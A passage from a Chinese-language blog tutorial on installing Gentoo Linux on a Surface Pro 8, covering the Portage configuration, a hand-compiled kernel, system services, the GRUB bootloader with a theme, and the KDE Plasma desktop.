class="hljs-section">[binhost]</span><br><span class="hljs-attr">priority</span> = <span class="hljs-number">9999</span><br><span class="hljs-attr">sync-uri</span> = https://distfiles.gentoo.org/releases/&lt;arch&gt;/binpackages/&lt;profile&gt;/x86-<span class="hljs-number">64</span>/<br></code></pre></td></tr></table></figure><p>对于想要以获取二进制可执行文件的形式进行安装的软件包，在使用 <code>emerge</code> 安装软件时添加 <code>--getbinpkg</code> 即可，也可以通过修改 <code>/etc/portage/make.conf</code> 文件并添加 <code>FEATURES</code> 变量来完成，例如：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Appending getbinpkg to the list of values within the FEATURES variable</span><br><span class="hljs-attr">FEATURES</span>=<span class="hljs-string">&quot;$&#123;FEATURES&#125; getbinpkg&quot;</span><br><span class="hljs-comment"># Require signatures</span><br><span class="hljs-attr">FEATURES</span>=<span class="hljs-string">&quot;$&#123;FEATURES&#125; binpkg-request-signature&quot;</span><br></code></pre></td></tr></table></figure><p>若选择这种方式，则在修改后需要额外运行 <code>getuto</code> 命令进行配置</p></blockquote><p>接下来配置 <code>CPU_FLAGS_*</code> 变量，编译器会在编译特定汇编代码&#x2F;指令时使用，笔者是 <code>x86/64</code> 架构所以应当为 <code>CPU_FLAGS_X86</code> ，不过工具 <code>cpuid2cpuflags</code> 可以帮我们完成输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --oneshot app-portage/cpuid2cpuflags</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/* <span class="hljs-subst">$(cpuid2cpuflags)</span>&quot;</span> &gt; /etc/portage/package.use/00cpu-flags</span><br></code></pre></td></tr></table></figure><p>接下来在 <code>/etc/portage/make.conf</code> 中添加 <code>VIDEO_CARDS</code> 变量，用以恰当地配置 GPU，Surface Pro 8 只有一个 Intel 核显所以该变量应为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">VIDEO_CARDS</span>=<span class="hljs-string">&quot;intel&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：可接受的 License）</p><p>如果你对软件包有 License 洁癖，不是 GPL&#x2F;MIT&#x2F;.. 的不用，则可以配置 <code>ACCEPT_LICENSE</code> 变量，建议参照官方的 handbook</p><p>如果想全都接收，则在 <code>/etc/portage/make.conf</code> 中将该变量设为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ACCEPT_LICENSE</span>=<span class="hljs-string">&quot;*&quot;</span><br></code></pre></td></tr></table></figure></blockquote><p>接下来配置时区，笔者用的是 systemd ，所以直接将时区文件软链接到 <code>/etc/localtime</code> 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br></code></pre></td></tr></table></figure><p>然后是进行本地化配置，在 <code>/etc/locale.gen</code> 中添加对应项即可，例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">en_US</span> ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><br><span class="hljs-attribute">en_US</span>.UTF-<span class="hljs-number">8</span> UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">zh_CN</span> GBK <br><span class="hljs-attribute">zh_CN</span>.UTF-<span class="hljs-number">8</span> UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>接下来运行 <code>locale-gen</code> 命令，其会根据  <code>/etc/locale.gen</code> 中项进行生成，生成结束后通过 <code>eselect</code> 命令进行选择，这里最好先选择 <code>C.utf8</code> ，完成之后更新环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">locale-gen</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect locale list</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect locale <span class="hljs-built_in">set</span> 2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">env-update &amp;&amp; <span class="hljs-built_in">source</span> /etc/profile &amp;&amp; <span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot) <span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>对于中文用户，你可能会需要 gentoo 中文社区的仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-eselect/eselect-repository</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect repository <span class="hljs-built_in">enable</span> gentoo-zh</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emaint <span class="hljs-built_in">sync</span> -r gentoo-zh</span><br></code></pre></td></tr></table></figure><h2 id="编译与安装内核"><a href="#编译与安装内核" class="headerlink" title="编译与安装内核"></a>编译与安装内核</h2><blockquote><p>（可选配置：安装固件与微码）</p><p>在开始配置内核前我们可以安装可选的微码与固件，Surface Pro 8 是 Intel CPU，所以微码应当安装 <code>sys-firmware/intel-microcode</code> 包，固件则都为通用的 <code>sys-kernel/linux-firmware</code> 包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-firmware/intel-microcode</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/linux-firmware</span><br></code></pre></td></tr></table></figure><p>可能会遇到 <code>all ebuilds that could satisfy * have been masked</code> 的错误，这是因为 LICENSE 配置问题，通过如下命令进行补充即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;sys-kernel/linux-firmware @BINARY-REDISTRIBUTABLE&quot;</span> | <span class="hljs-built_in">tee</span> -a /etc/portage/package.license</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;sys-firmware/intel-microcode @BINARY-REDISTRIBUTABLE&quot;</span> | <span class="hljs-built_in">tee</span> -a /etc/portage/package.license</span><br></code></pre></td></tr></table></figure></blockquote><p>虽然内核主线暂且缺少一些 Surface 驱动，但是有一个社区项目 <a href="https://github.com/linux-surface/linux-surface">linux-surface</a> 提供了部分驱动，可惜的是该项目本身仅提供 Arch&#x2F;Debian&#x2F;Fedora 的版本，而在 Wiki 中 fork 到 Gentoo 这边<a href="https://github.com/Parinz/Surface-Gentoo">对应仓库</a>的维护者不知道什么时候已经跑路了，因此笔者只能先用默认的内核，这里我们有三种大方向上的选择：</p><ul><li>安装 <a href="https://wiki.gentoo.org/wiki/Project:Distribution_Kernel">Distribution kernels</a>：Gentoo 官方维护的 kernel，涵盖了内核编译安装的完整过程且已经配置好了一份支持主要硬件的配置文件，<a href="https://wiki.gentoo.org/wiki/Project:Distribution_Kernel#Modifying_kernel_configuration">配置文件也可以手工更改</a>，安装方法与装普通软件包无异</li><li>使用 <a href="https://wiki.gentoo.org/wiki/Genkernel">Genkernel</a> 进行配置：<code>genkernel</code> 是 Gentoo 官方提供的用来自动构建内核与 initramfs 的软件，简化了使用者手工安装内核的过程</li><li>纯手工编译安装内核：通过 <code>eselect kernel</code> 拉取内核源码后手工 <code>make</code> 进行配置、编译、安装，_<a href="https://github.com/arttnba3/XDU-SCE_OS-Experiment_2021/tree/main/Exp-7">就像你的操作系统老师让你在操作系统实验课上做的那样</a>_ ， <del>没让你自己从 kernel.org 拉就偷着乐吧</del></li></ul><p>作为 Linux kernel hacker，手工编译内核自然是第一选择，主要原因是方便更改编译选项 <del>而且这样看起来会显得👴比较帅</del> </p><blockquote><p>不选 distribution 的原因是配置文件中可能未必默认包含笔者需要的硬件驱动，再逐条改起来有点麻烦，而 Genkernel 感觉有点上不去下不来卡在那里了</p></blockquote><p>首先安装必要的工具：</p><blockquote><p>其中 <a href="https://wiki.gentoo.org/wiki/Installkernel">installkernel</a> 是可选包，用于自动安装新的内核并更新 bootloader 配置， <del>如果你比较闲的话也可以手工完成</del></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-apps/pciutils</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/installkernel</span><br></code></pre></td></tr></table></figure><p>拉取 Gentoo 官方维护的内核源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/gentoo-sources</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你选择用 gentoo 官方的内核配置（<code>gentoo-kernel</code>），可能出现提示需要检查 configure 的问题，使用如下命令修复：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">dispatch-conf</span><br></code></pre></td></tr></table></figure><p>基本上一路 <code>u</code> （update） 即可</p></blockquote><p>使用如下命令查看当前安装的源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect kernel list</span><br></code></pre></td></tr></table></figure><p>通常我们会在 Linux 系统中维护一个指向当前内核源码的符号链接 <code>/usr/src/linux</code>，在 Gentoo 下我们通过如下命令手动创建（序号由 <code>eselect</code> 命令获得）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect kernel <span class="hljs-built_in">set</span> 1</span><br></code></pre></td></tr></table></figure><p>接下来创建配置文件 <code>.config</code> ，这里笔者使用 <code>make localyesconfig</code> 来检测硬件并决定开启的内核模块，你也可以用默认的 <code>make defconfig</code> ，根据自己的需求进行选择即可：</p><blockquote><p>内核模块会被编译到 vmlinuz 中，如果你想让内核模块独立存在，使用 <code>localmodconfig</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /usr/src/linux</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">make localyesconfig</span><br></code></pre></td></tr></table></figure><p>接下来用 menuconfig 手动改一些选项，其会在已有的 <code>.config</code> 基础上进行修改，这里我们要决定的包括 OpenRC&#x2F;systemd 的选择、常用文件系统支持、额外选一些 Surface 相关的驱动等，具体参见 <a href="https://wiki.gentoo.org/wiki/Handbook:AMD64/Installation/Kernel#Alternative:_Manual_configuration">Gentoo handbook</a>：</p><blockquote><p>在这一步，你可能会需要手动开启 iwlwifi 的编译支持，参见 <a href="https://wiki.gentoo.org/wiki/Iwlwifi">Gentoo wiki - iwlwifi</a> 的 <code>Device driver wilwifi</code>  一节</p><p>在这一步，你还可能会需要手动将网卡固件添加到配置中，参见 <a href="https://wiki.gentoo.org/wiki/Iwlwifi">Gentoo wiki - iwlwifi</a> 的 <code>Firmware</code>  一节<a href="https://wiki.gentoo.org/wiki/Iwlwifi">https://wiki.gentoo.org/wiki/Iwlwifi</a>)</p><blockquote><p>如果不清楚应该添加哪个固件，可以 <code>dmesg | grep -i wifi | grep -i ucode</code> 查看在 LiveISO 当中使用的是哪个</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">make menuconfig</span><br></code></pre></td></tr></table></figure><p>然后开始编译内核，这可能会需要一定的时间：</p><blockquote><p>实际上在笔者的机器上 8 分钟左右就能完成了，笔者也没想到 <code>1135g7</code> 的性能这么强，可能这就是科技的进步吧 ：）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">make -j$(<span class="hljs-built_in">nproc</span>) &amp;&amp; make modules_install -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><p>接下来使用 <a href="https://wiki.gentoo.org/wiki/Installkernel">installkernel</a> 安装内核，这里笔者选择使用 <code>GRUB + systemd</code> ，首先创建文件 <code>/etc/portage/package.use/installkernel</code> 并写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-kernel/installkernel grub dracut<br></code></pre></td></tr></table></figure><p>然后运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/installkernel</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">make install</span><br></code></pre></td></tr></table></figure><h2 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h2><p>首先配置 <code>/etc/fstab</code> ，这个文件决定了在系统启动时哪些分区该被挂载到哪些目录，为了保证挂载的一致性，通常我们会选择使用一个分区的 UUID 进行挂载，而非设备路径，因为在有着多个磁盘的环境中不同磁盘的路径在启动后未必一致</p><blockquote><p>不过因为笔者的 Surface Pro 8 仅有一个盘位，所以是可以使用设备路径进行挂载的，但保险起见还是用 UUID 进行挂载</p></blockquote><p>首先查看不同分区的 UUID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">blkid</span><br></code></pre></td></tr></table></figure><p>接下来按照分区用途编写 fstab，以笔者的配置为例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UUID</span>=f0e95c49-e05d-<span class="hljs-number">4659</span>-a617-bfdaee35af7c none       swap  sw           <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">UUID</span>=<span class="hljs-number">8317</span>cece-<span class="hljs-number">8</span>c46-<span class="hljs-number">4</span>fec-bdf6-ddab4aa23249 /          ext4  defaults     <span class="hljs-number">0</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">UUID</span>=<span class="hljs-number">5</span>e8624e3-b40e-<span class="hljs-number">4</span>e6c-be02-e72a99e94462 /home      ext4  data=ordered <span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">UUID</span>=C215-<span class="hljs-number">9</span>C27                            /boot/efi  vfat  utf8         <span class="hljs-number">0</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>然后配置主机名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Surface-Pro-8&quot;</span> &gt; /etc/hostname</span><br></code></pre></td></tr></table></figure><p>配置 DHCP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/dhcpcd</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> dhcpcd</span><br></code></pre></td></tr></table></figure><p>设置 root 密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">passwd</span><br></code></pre></td></tr></table></figure><p>初始化一些配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemd-machine-id-setup</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemd-firstboot --prompt</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl preset-all --preset-mode=enable-only</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl preset-all</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选）配置文件索引</p><p>通过空间换时间的方式加快文件搜索速度：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-apps/mlocate</span><br></code></pre></td></tr></table></figure></blockquote><p>配置 shell 自动补全，gentoo 默认使用 bash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-shells/bash-completion</span><br></code></pre></td></tr></table></figure><p>配置时间同步：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/chrony</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> chronyd.service</span><br></code></pre></td></tr></table></figure><p>配置文件系统和磁盘相关的一些工具，笔者只用 ext4 和 fat32：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-fs/e2fsprogs</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-fs/dosfstools</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-block/io-scheduler-udev-rules</span><br></code></pre></td></tr></table></figure><p>安装网络相关的一些包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-dialup/ppp</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-wireless/iw net-wireless/wpa_supplicant</span><br></code></pre></td></tr></table></figure><p>安装 NetworkManager：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/networkmanager</span><br></code></pre></td></tr></table></figure><p>完成后我们通过修改 <code>/etc/portage/make.conf</code> 中的 USE flags 添加相关软件对 NetworkManager 的支持：</p><blockquote><p>添加完 USE flags 后别忘了通过如下命令进行更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --changed-use --deep @world</span><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">USE</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;$&#123;USE&#125; networkmanager&quot;</span><br></code></pre></td></tr></table></figure><p>完成安装后启用对应的 systemd service：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> NetworkManager</span><br></code></pre></td></tr></table></figure><p>安装 sudo ，解注释 <code>%wheel ALL=(ALL:ALL) ALL</code> 所在行： </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-admin/sudo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">visudo</span><br></code></pre></td></tr></table></figure><p>前面我们只配置了 root 用户，所以别忘了配置一个日常用的管理员用户：</p><blockquote><p>这里会报一个 <code>Creating mailbox file: No such file or directory</code> 的错误，可以不用管</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">groupadd arttnba3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">useradd -g arttnba3 -m -G <span class="hljs-built_in">users</span>,wheel,audio,cdrom,floppy,portage,usb,video -s /bin/bash arttnba3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">passwd arttnba3</span><br></code></pre></td></tr></table></figure><h2 id="安装-boot-loader"><a href="#安装-boot-loader" class="headerlink" title="安装 boot loader"></a>安装 boot loader</h2><p>按惯例直接用 GRUB 就行， <del>真的会有人去用 systemd-boot 🐴</del> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;GRUB_PLATFORMS=&quot;efi-64&quot;&#x27;</span> &gt;&gt; /etc/portage/make.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --update --newuse --verbose sys-boot/grub</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-boot/os-prober</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=Gentoo</span><br></code></pre></td></tr></table></figure><p>默认的 grub 主题比较难看，而且在高分辨率屏下看着属实有些难受，所以笔者这里选择安装一个 <a href="">minegrub</a> 主题，首先克隆仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask dev-vcs/git</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> ~</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/Lxtharia/minegrub-theme.git</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> ./minegrub-theme</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> -ruv ./minegrub /boot/grub/themes/</span><br></code></pre></td></tr></table></figure><p>接下来修改 grub 配置文件 <code>/etc/default/grub</code>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GRUB_THEME=<span class="hljs-regexp">/boot/g</span>rub<span class="hljs-regexp">/themes/mi</span>negrub/theme.txt<br></code></pre></td></tr></table></figure><p>添加自动更新背景字体的 systemd 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> ./minegrub-update.service /etc/systemd/system</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> minegrub-update.service</span><br></code></pre></td></tr></table></figure><p>最后将 grub 配置写入 grub.cfg 中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><p>最后重启系统，别忘了拔 u 盘：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">exit</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">umount -l /mnt/gentoo/dev&#123;/shm,/pts,&#125;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">umount -R /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">reboot</span><br></code></pre></td></tr></table></figure><p>进入系统后我们用 os-probe 完成双系统引导中对 Windows 的检测以及 grub entry 的生成（当然如果你比较闲也可以手写），这里别忘了检查 <code>/etc/default/grub</code> 中是否有 <code>GRUB_DISABLE_OS_PROBER=false</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><h2 id="安装-KDE-Wayland"><a href="#安装-KDE-Wayland" class="headerlink" title="安装 KDE + Wayland"></a>安装 KDE + Wayland</h2><p>首先按惯例连接网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmtui</span><br></code></pre></td></tr></table></figure><p>然后安装  <a href="https://packages.gentoo.org/packages/kde-plasma/plasma-meta">kde-plasma&#x2F;plasma-meta</a> 和  <a href="https://packages.gentoo.org/packages/kde-apps/kde-apps-meta">kde-apps&#x2F;kde-apps-meta</a>，不过不同于其他的滚动发行版（Arch、openSUSE Tumbleweed、Debian Sid 等）或是贴近上游的常规发行版（如 Fedora Spin），Gentoo 滚得比较慢，目前 stable 分支还停留在 KDE 5.27：</p><blockquote><p>如果你不想安装其中的部分组件，可以非常轻松地通过 USE flag 进行定义，例如 <code>USE=&quot;kde-plasma/plasma-meta -xwayland&quot;</code> 将不会安装 <code>xwayland</code> ，通过 <code>-sddm</code> flag 也可以将默认的 sddm 替换为 lightdm，可用的 USE flag 详见 <a href="https://wiki.gentoo.org/wiki/KDE">Gentoo wiki</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask kde-plasma/plasma-meta</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask kde-apps/kde-apps-meta</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你和笔者一样使用类似 Surface Pro 的性能比较低下的笔记本，那么这个编译会耗费相当长的时间（至少数个小时），正所谓 <code>“一杯茶，一包烟，Gentoo编译一整天”</code> （笑）</p></blockquote><p>plasma-meta 包自带依赖 sddm ，直接启用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now sddm.service</span><br></code></pre></td></tr></table></figure><p>最后进入到大家熟悉的 KDE 桌面，非常好的是默认使用 wayland，但非常坏的是 Plasma 6 在各大发行版都铺开了的时候 Gentoo 这边还停在 <code>5.27</code> ：</p><p><img src="https://s2.loli.net/2024/05/06/kdpR871gunKx4wt.png"></p><blockquote><p>需要注意的是 Linux on Surface 由于缺少相应的触摸板驱动，触摸板使用体验极其糟糕，在系统设置中也无法被检测为触摸板</p></blockquote><h2 id="安装中文字体与输入法"><a href="#安装中文字体与输入法" class="headerlink" title="安装中文字体与输入法"></a>安装中文字体与输入法</h2><p>首先安装中文字体，毕竟大家都不喜欢看到一大片方块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask media-fonts/arphicfonts</span><br></code></pre></td></tr></table></figure><p>中文输入法按惯例选择来自 Gentoo 中文社区的 fcitx ，不过默认被 masked 了，得先 unmasked 一下：</p><blockquote><p>如果没有，检查一下你的 <code>gentoo-zh</code> 